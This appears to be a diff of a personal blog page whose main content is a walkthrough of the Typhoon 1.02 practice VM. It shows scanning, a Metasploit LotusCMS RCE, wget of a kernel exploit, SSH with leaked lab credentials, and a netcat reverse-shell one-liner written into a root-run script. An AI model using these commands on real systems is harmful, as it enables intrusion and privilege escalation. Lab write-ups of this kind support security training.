@@ -6,10 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta property="og:type" content="article">
+    <meta name="description" content="Warning !! Spoilers Ahead Netdiscover Scan1netdiscover -i usb0  Nmap Scan1nmap -sC -sV -Pn 192.168.42.217 Through the scan we can observe that the Anonymous FTP login is allowed.There is a SSH, http">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Typhoon 1.02 Writeup">
 <meta property="og:url" content="https://mrt4ntr4.github.io/Typhoon%20Writeup/index.html">
 <meta property="og:site_name" content="mrT4ntr4&#39;s Blog">
+<meta property="og:description" content="Warning !! Spoilers Ahead Netdiscover Scan1netdiscover -i usb0  Nmap Scan1nmap -sC -sV -Pn 192.168.42.217 Through the scan we can observe that the Anonymous FTP login is allowed.There is a SSH, http">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://mrt4ntr4.github.io/img/typhoon/tt2.png">
 <meta property="og:image" content="https://mrt4ntr4.github.io/img/typhoon/t1.png">
@@ -127,6 +129,8 @@
           <li><a href="/archives/">Posts</a></li>
          
           <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/art/">Art</a></li>
         
       </ul>
     </span>
@@ -214,34 +218,34 @@
   
 
   <div class="content" itemprop="articleBody">
-    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/typhoon/tt2.png" title="banner" class="gallery-item"><img src="/img/typhoon/tt2.png" alt="banner"></a></p>
+    <div class=".post-images"><p><a href="/img/typhoon/tt2.png" title="banner" class="post-image-item"><img src="/img/typhoon/tt2.png" alt="banner"></a></p>
 <p>Warning !! Spoilers Ahead</p>
 <h2 id="Netdiscover-Scan"><a href="#Netdiscover-Scan" class="headerlink" title="Netdiscover Scan"></a>Netdiscover Scan</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i usb0</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t1.png" class="gallery-item"><img src="/img/typhoon/t1.png"></a></p>
+<p><a href="/img/typhoon/t1.png" class="post-image-item"><img src="/img/typhoon/t1.png"></a></p>
 <h2 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -Pn 192.168.42.217</span><br></pre></td></tr></table></figure>
 <p>Through the scan we can observe that the Anonymous FTP login is allowed.<br>There is a SSH, http and other ports.</p>
-<p><a href="/img/typhoon/t2.png" class="gallery-item"><img src="/img/typhoon/t2.png"></a></p>
+<p><a href="/img/typhoon/t2.png" class="post-image-item"><img src="/img/typhoon/t2.png"></a></p>
 <pre>3<                 ----Snip Snip----                   3<</pre>
 
-<p><a href="/img/typhoon/t3.png" class="gallery-item"><img src="/img/typhoon/t3.png"></a></p>
+<p><a href="/img/typhoon/t3.png" class="post-image-item"><img src="/img/typhoon/t3.png"></a></p>
 <p>But lets first enumerate the webpage.<br>To do that we first open the webpage on our browser.</p>
-<p><a href="/img/typhoon/t4.png" class="gallery-item"><img src="/img/typhoon/t4.png"></a></p>
+<p><a href="/img/typhoon/t4.png" class="post-image-item"><img src="/img/typhoon/t4.png"></a></p>
 <h2 id="Dirb-Scan"><a href="#Dirb-Scan" class="headerlink" title="Dirb Scan"></a>Dirb Scan</h2><p>We find nothing in the source so we move forward with dirb.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.42.217</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t5.png" class="gallery-item"><img src="/img/typhoon/t5.png"></a></p>
+<p><a href="/img/typhoon/t5.png" class="post-image-item"><img src="/img/typhoon/t5.png"></a></p>
 <p>We see a hell lot of vulnerabilities as this is Lab Box for pentesting.<br>So we will exploit this VM with CMS and mongoDB.</p>
 <h1 id="1st-Method-LotusCMS"><a href="#1st-Method-LotusCMS" class="headerlink" title="1st Method [LotusCMS]"></a>1st Method [LotusCMS]</h1><h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><p>We move over to the login page of the LotusCMS.</p>
-<p><a href="/img/typhoon/t6.png" class="gallery-item"><img src="/img/typhoon/t6.png"></a></p>
+<p><a href="/img/typhoon/t6.png" class="post-image-item"><img src="/img/typhoon/t6.png"></a></p>
 <p>And using our Google fu skills we find that there lies a CVE online regarding LotusCMS eval() Remote Code Execution Vulnerability.</p>
-<p><a href="/img/typhoon/t7.png" class="gallery-item"><img src="/img/typhoon/t7.png"></a></p>
+<p><a href="/img/typhoon/t7.png" class="post-image-item"><img src="/img/typhoon/t7.png"></a></p>
 <p>We then head over to our Saviour Metasploit and search for the exploit.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search lotuscms</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t8.png" class="gallery-item"><img src="/img/typhoon/t8.png"></a></p>
+<p><a href="/img/typhoon/t8.png" class="post-image-item"><img src="/img/typhoon/t8.png"></a></p>
 <p>Now We set some options which are necessary for the exploit to work ie. RHOST and URI.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 192.168.42.217</span><br><span class="line"><span class="built_in">set</span> URI /cms/</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t9.png" class="gallery-item"><img src="/img/typhoon/t9.png"></a></p>
+<p><a href="/img/typhoon/t9.png" class="post-image-item"><img src="/img/typhoon/t9.png"></a></p>
 <p>We get a meterpreter session opened for us.<br>Seems quite EASY XD</p>
-<p><a href="/img/typhoon/t10.png" class="gallery-item"><img src="/img/typhoon/t10.png"></a></p>
+<p><a href="/img/typhoon/t10.png" class="post-image-item"><img src="/img/typhoon/t10.png"></a></p>
 <p>I create a shell using:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell -i</span><br></pre></td></tr></table></figure>
 <p>and using <code>id</code> I came to know that we are the user “www-data”</p>
@@ -249,50 +253,50 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
 <p>We quickly search if there is any exploit available and found the following :</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 3.13</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t11.png" class="gallery-item"><img src="/img/typhoon/t11.png"></a></p>
+<p><a href="/img/typhoon/t11.png" class="post-image-item"><img src="/img/typhoon/t11.png"></a></p>
 <p>Then we copy our exploit into the remote Victim’s Machine.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/37292.c .</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t12.png" class="gallery-item"><img src="/img/typhoon/t12.png"></a></p>
+<p><a href="/img/typhoon/t12.png" class="post-image-item"><img src="/img/typhoon/t12.png"></a></p>
 <p>Then We start a simple python server on port 8888 to transfer remotely.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure>
 <p>We simply copy our IP Address and issue a wget command on the VM.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t13.png" class="gallery-item"><img src="/img/typhoon/t13.png"></a></p>
+<p><a href="/img/typhoon/t13.png" class="post-image-item"><img src="/img/typhoon/t13.png"></a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://IP:8888/37292.c</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t14.png" class="gallery-item"><img src="/img/typhoon/t14.png"></a></p>
+<p><a href="/img/typhoon/t14.png" class="post-image-item"><img src="/img/typhoon/t14.png"></a></p>
 <p>And later Compile our exploit C code and output that to exploit executable.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 37292.c -o exploit</span><br></pre></td></tr></table></figure>
 
-<p><a href="/img/typhoon/t15.png" class="gallery-item"><img src="/img/typhoon/t15.png"></a></p>
+<p><a href="/img/typhoon/t15.png" class="post-image-item"><img src="/img/typhoon/t15.png"></a></p>
 <p>BoomYa!! After running the exploit we are Root…</p>
 <p>We then navigate to the /root directory to get the root-flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">cat root-flag</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t16.png" class="gallery-item"><img src="/img/typhoon/t16.png"></a></p>
+<p><a href="/img/typhoon/t16.png" class="post-image-item"><img src="/img/typhoon/t16.png"></a></p>
 <h1 id="2nd-Method-mongodb"><a href="#2nd-Method-mongodb" class="headerlink" title="2nd Method [mongodb]"></a>2nd Method [mongodb]</h1><h2 id="User-Enumeration-1"><a href="#User-Enumeration-1" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><p>We also got a robots.txt file.</p>
-<p><a href="/img/typhoon/t17.png" class="gallery-item"><img src="/img/typhoon/t17.png"></a></p>
+<p><a href="/img/typhoon/t17.png" class="post-image-item"><img src="/img/typhoon/t17.png"></a></p>
 <p>It has 1 disallowed entry which is for ‘mongoadmin’.</p>
 <p>Navigate to the directory on our browser.</p>
-<p><a href="/img/typhoon/t18.png" class="gallery-item"><img src="/img/typhoon/t18.png"></a></p>
+<p><a href="/img/typhoon/t18.png" class="post-image-item"><img src="/img/typhoon/t18.png"></a></p>
 <p>Then we select the Change database option.</p>
-<p><a href="/img/typhoon/t19.png" class="gallery-item"><img src="/img/typhoon/t19.png"></a></p>
+<p><a href="/img/typhoon/t19.png" class="post-image-item"><img src="/img/typhoon/t19.png"></a></p>
 <p>We see that there is an entry for a database named as ‘creds’ which has 2 records in it.</p>
 <p>Clicking on it displays the records :</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username : typhoon </span><br><span class="line">Password : 789456123</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t20.png" class="gallery-item"><img src="/img/typhoon/t20.png"></a></p>
+<p><a href="/img/typhoon/t20.png" class="post-image-item"><img src="/img/typhoon/t20.png"></a></p>
 <p>Later I figure out that we can use these Credentials to login using SSH Service into the Vulnerable<br>Machine.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh typhoon@192.168.42.217</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t21.png" class="gallery-item"><img src="/img/typhoon/t21.png"></a></p>
+<p><a href="/img/typhoon/t21.png" class="post-image-item"><img src="/img/typhoon/t21.png"></a></p>
 <h2 id="Privilege-Escalation-1"><a href="#Privilege-Escalation-1" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>We enumerate for the files which have overwrite access and grep the files which are owned by root.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm /o+w | grep -Ev <span class="string">&#x27;(proc|sys|www)&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t22.png" class="gallery-item"><img src="/img/typhoon/t22.png"></a></p>
+<p><a href="/img/typhoon/t22.png" class="post-image-item"><img src="/img/typhoon/t22.png"></a></p>
 <p>We come across a bash script in /tab directory.</p>
-<p><a href="/img/typhoon/t23.png" class="gallery-item"><img src="/img/typhoon/t23.png"></a></p>
+<p><a href="/img/typhoon/t23.png" class="post-image-item"><img src="/img/typhoon/t23.png"></a></p>
 <p>What if we inject any malicious code to it and lets see if it gets executed.<br>We copy a Netcat Reverse Shell Bash Script from Pentest Monkey and echo that into the script.sh file.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f&quot;</span> &gt;  /tab/script.sh</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t24.png" class="gallery-item"><img src="/img/typhoon/t24.png"></a></p>
+<p><a href="/img/typhoon/t24.png" class="post-image-item"><img src="/img/typhoon/t24.png"></a></p>
 <p>After setting our Netcat Listener we cat that file out and you seem to know the end… XD</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 5555</span><br></pre></td></tr></table></figure>
-<p><a href="/img/typhoon/t25.png" class="gallery-item"><img src="/img/typhoon/t25.png"></a></p>
+<p><a href="/img/typhoon/t25.png" class="post-image-item"><img src="/img/typhoon/t25.png"></a></p>
 <p>$ Granted SUDO</p>
 <p>Don’t Believe !!</p>
 <p>Try Yourself to discover more Vulnerabilies  </p>
@@ -300,12 +304,7 @@
 
 
 
-</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
-        var options = {
-            selector: '.gallery-item'
-        };
-        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
-        }</script>
+</div>
   </div>
 </article>
 
@@ -325,6 +324,8 @@
           <li><a href="/archives/">Posts</a></li>
          
           <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/art/">Art</a></li>
         
       </ul>
     </div>
@@ -366,7 +367,7 @@
     Copyright &copy;
     
     
-    2021-2023
+    2021-2024
     Suraj Malhotra
   </div>
   <div class="footer-right">
@@ -380,6 +381,8 @@
           <li><a href="/archives/">Posts</a></li>
          
           <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/art/">Art</a></li>
         
       </ul>
     </nav>
@@ -395,12 +398,47 @@
 <link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
 
+<link rel="stylesheet" href="/lib/lightgallery/css/lightgallery.css">
+
+
+<link rel="stylesheet" href="/lib/lightgallery/css/lg-zoom.css">
+
+
+<link rel="stylesheet" href="/lib/lightgallery/css/lg-thumbnail.css">
+
+
+<link rel="stylesheet" href="/lib/lightgallery/css/lg-autoplay.css">
+
+
+<link rel="stylesheet" href="/lib/lightgallery/css/lg-transitions.css">
+
+
+<link rel="stylesheet" href="/lib/lightgallery/css/lg-fullscreen.css">
+
     <!-- jquery -->
 
 <script src="/lib/jquery/jquery.min.js"></script>
 
 
 <script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- lightgallery -->
+
+<script src="/lib/lightgallery/lightgallery.min.js"></script>
+
+
+<script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script>
+
+
+<script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script>
+
+
+<script src="/lib/lightgallery/plugins/autoplay/lg-autoplay.min.js"></script>
+
+
+<script src="/lib/lightgallery/plugins/fullscreen/lg-fullscreen.min.js"></script>
+
+
 
 <!-- clipboard -->
 
